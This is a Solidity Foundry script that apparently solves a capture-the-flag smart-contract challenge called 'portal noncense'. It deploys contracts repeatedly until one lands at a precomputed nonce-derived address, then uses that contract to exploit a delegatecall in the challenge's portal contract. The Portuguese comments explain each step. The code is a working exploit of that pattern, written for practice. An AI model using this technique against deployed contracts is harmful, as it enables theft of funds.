// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../src/blockchain_portal_noncense/Portal.sol";
import "../src/blockchain_portal_noncense/Setup.sol";
import "../lib/forge-std/src/Script.sol";
import "../lib/forge-std/src/console.sol";

contract MyContract {
  mapping(string => address) public destinations;
  mapping(string => bool) public isPortalActive;
  bool isExpertStandby;

  function connect() external returns(bool) {
    isPortalActive["orcKingdom"] = true;
    return true;
  } 
}

contract PortalNoncenseSolution is Script {
    PortalStation public level =
        PortalStation(payable(0xACef632826fb9d4EF70cB70640b5F56b7474B3a9));
    Setup public level_setup =
        Setup(payable(0xfD730FDDbD5b98471b7a0fE78d2CB0Fd0E5454BA));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_PORTAL_NONCENSE"));
        MyContract contractNew;
        for (uint i=0; i <= 130; i++) { 
            //usei o script python em auxiliar_src/getNonceCreate.py pra saber que na transação 130 (nonce 130) nós conseguimos criar um contrato com endereço 0xFC31cde4aCbF2b1d2996a2C7f695E850918e4007
            //Conseguindo escrever nesse endereço nós criamos o nosso contrato que explora a implementação de delegatecall
            contractNew = new MyContract();
            if (address(contractNew) == address(0xFC31cde4aCbF2b1d2996a2C7f695E850918e4007)) {
                break;
            } 
        }
        level.createPortal("orcKingdom"); 
    }
}

